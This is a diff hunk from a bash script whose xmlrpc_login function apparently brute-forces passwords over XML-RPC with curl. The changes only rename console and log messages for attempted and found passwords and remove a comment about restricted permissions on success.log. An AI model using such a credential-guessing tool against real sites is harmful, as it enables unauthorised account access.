@@ -21,11 +21,11 @@ xmlrpc_login() {
 
     # Checking the response for authentication failure
     if [[ $curl_response == *"Incorrect"* ]]; then
-        echo "Trying Password: ${password}"
+        echo "[ATTEMPTED] ${password}"
         echo "[ATTEMPTED] ${password}" >> attempts.log
     else
-        echo -e "\nPassword found: ${password}"
-        echo "${password}" >> success.log  # Logging to a file with restricted permissions
+        echo -e "\n[FOUND] ${password}"
+        echo -e "\n[FOUND] ${password}" >> success.log
         echo -e "\n${curl_response}" >> success.log
         exit 0
     fi
